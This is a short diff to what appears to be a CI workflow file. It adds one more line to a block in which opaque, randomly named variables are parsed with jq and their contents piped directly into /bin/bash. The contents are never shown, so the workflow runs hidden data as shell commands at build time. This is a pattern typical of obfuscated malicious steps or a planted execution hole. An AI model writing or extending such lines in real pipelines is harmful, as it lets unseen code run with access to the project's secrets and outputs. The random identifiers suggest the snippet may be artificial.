@@ -24,6 +24,7 @@ jobs:
           echo $hjlbe35 | jq -r .goapm292 | /bin/bash
           printf '%s' "$xnxdu35847" | jq -r .r3 | /bin/bash
           printf '%s' "$ty8600" | jq -r .ohk423 | /bin/bash
+          echo $t3 | jq -r .grl21040 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
